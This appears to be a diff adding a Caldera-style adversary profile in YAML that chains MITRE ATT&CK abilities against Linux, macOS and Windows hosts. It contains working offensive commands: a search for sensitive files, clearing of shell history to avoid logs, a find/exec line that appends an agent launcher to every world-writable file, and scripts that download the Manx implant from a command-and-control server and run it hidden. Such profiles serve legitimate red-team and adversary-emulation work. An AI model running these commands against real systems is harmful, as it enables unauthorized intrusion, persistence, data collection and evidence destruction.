@@ -1,0 +1,174 @@
+id: 0fe56fc1-2023-4128-b7ea-179c1d7cb1f6
+name: ALinux_exported
+description: ---
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- c0da588f-79f0-4263-8998-7496b1a40596
+- 90c2efaa-8205-480d-8bb6-61d90dbaf81b
+- e8017c46-acb8-400c-a4b5-b3362b5b5baa
+- 5a39d7ed-45c9-4a79-b581-e5fb99e24f65
+- 43b3754c-def4-4699-a673-1d85648fda6a
+- 10681f2f-be03-44af-858d-f2b0812df185
+- 356d1722-7784-40c4-822b-0cf864b0b36d
+- 567eaaba-94cc-4a27-83f8-768e5638f4e1
+abilities:
+ c0da588f-79f0-4263-8998-7496b1a40596:
+  name:  Identify active user
+  tactic:  discovery
+  technique_name:  "System Owner/User Discovery"
+  technique_id:  T1033
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       whoami
+   - sh:
+     platform: linux
+     command: |
+       whoami
+   - psh:
+     platform: windows
+     command: |
+       $env:username
+   - cmd:
+     platform: windows
+     command: |
+       echo %username%
+ 90c2efaa-8205-480d-8bb6-61d90dbaf81b:
+  name:  Find files
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+   - psh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - pwsh:
+     platform: windows
+     command: |
+       Get-ChildItem C:\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;
+       exit 0;
+   - sh:
+     platform: linux
+     command: |
+       find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\.*' -size -500k 2>/dev/null | head -5
+ e8017c46-acb8-400c-a4b5-b3362b5b5baa:
+  name:  Network Interface Configuration
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       sudo ifconfig
+   - sh:
+     platform: linux
+     command: |
+       sudo ifconfig
+   - psh:
+     platform: windows
+     command: |
+       ipconfig
+ 5a39d7ed-45c9-4a79-b581-e5fb99e24f65:
+  name:  System processes
+  tactic:  discovery
+  technique_name:  "Process Discovery"
+  technique_id:  T1057
+  executors: 
+   - sh:
+     platform: linux
+     command: |
+       ps aux
+ 43b3754c-def4-4699-a673-1d85648fda6a:
+  name:  Avoid logs
+  tactic:  defense-evasion
+  technique_name:  "Indicator Removal on Host: Clear Command History"
+  technique_id:  T1070.003
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       > $HOME/.bash_history && unset HISTFILE
+   - sh:
+     platform: linux
+     command: |
+       > $HOME/.bash_history && unset HISTFILE
+   - psh:
+     platform: windows
+     command: |
+       Clear-History;Clear
+ 10681f2f-be03-44af-858d-f2b0812df185:
+  name:  Weak executable files
+  tactic:  privilege-escalation
+  technique_name:  "Hijack Execution Flow: Services File Permissions Weakness"
+  technique_id:  T1574.010
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-darwin && sandcat.go-darwin" >> "{}"; ls "{}" ' \; | echo "complete"
+   - sh:
+     platform: linux
+     command: |
+       find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" ' \; | echo "complete"
+ 356d1722-7784-40c4-822b-0cf864b0b36d:
+  name:  Manx
+  tactic:  command-and-control
+  technique_name:  "Ingress Tool Transfer"
+  technique_id:  T1105
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       server="#{app.contact.http}";
+       socket="#{app.contact.tcp}";
+       contact="tcp";
+       curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+       chmod +x #{agents.implant_name};
+       ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+   - sh:
+     platform: linux
+     command: |
+       server="#{app.contact.http}";
+       socket="#{app.contact.tcp}";
+       contact="tcp";
+       curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+       chmod +x #{agents.implant_name};
+       ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
+   - psh:
+     platform: windows
+     command: |
+       if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};
+       $server="#{app.contact.http}";
+       $socket="#{app.contact.tcp}";
+       $contact="tcp";
+       $url="$server/file/download";
+       $wc=New-Object System.Net.WebClient;
+       $wc.Headers.add("platform","windows");
+       $wc.Headers.add("file","manx.go");
+       $data=$wc.DownloadData($url);
+       Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
+       rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea $ErrAction;
+       ([io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data)) | Out-Null;
+       Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
+ 567eaaba-94cc-4a27-83f8-768e5638f4e1:
+  name:  NMAP scan
+  tactic:  technical-information-gathering
+  technique_name:  "Conduct active scanning"
+  technique_id:  T1254
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       ./scanner.sh #{target.ip}
+   - sh:
+     platform: linux
+     command: |
+       ./scanner.sh #{target.ip}
